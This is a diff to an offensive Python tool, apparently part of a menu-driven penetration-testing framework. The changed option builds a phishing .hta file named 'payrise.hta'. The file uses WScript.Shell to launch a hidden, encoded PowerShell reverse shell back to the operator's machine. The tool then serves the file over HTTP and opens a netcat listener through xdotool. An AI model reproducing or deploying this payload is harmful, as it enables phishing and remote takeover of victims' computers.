@@ -2747,14 +2747,15 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='74':    
-      num = input("[*] Please specify listening port: ")
+      num1 = input("[*] Please specify http server port: ")
+      num2 = input("[*] Please specify listening port  : ")
       
-      if num.isdigit():
-         print("[*] Creating exploit...")
-      
+      if (num1.isdigit()) and (num2.isdigit()):
+         print("[*] Creating .hta payload...")
+              
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
-         a.run("powershell -nop -w 1 -enc {powershell(localIP, "80")}", 0);window.close();
+         a.run("powershell -nop -w 1 -enc {powershell(localIP, num2)}", 0);window.close();
          """.encode()
             
          bpayLoad = base64.b64encode(payLoad)
@@ -2763,14 +2764,14 @@ while True:
             hta.write(body(final))
          
          print("[+] Exploit created, utilise the following code snippet to activate...")
-         print(colored("\nhttp://" + localIP + ":" + num + "/payrise.hta",colour6))
+         print(colored("\nhttp://" + localIP + ":" + num1 + "/payrise.hta",colour6))
       
          print("\n[*] Starting phishing server...")
       
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
          command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'rlwrap nc -nvlp " + num + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'rlwrap nc -nvlp " + num2 + "'; xdotool key Return"); time.sleep(1)
          command("xdotool key Ctrl+Tab")    
       else:
          print("[-] Sorry I do not understand...") 
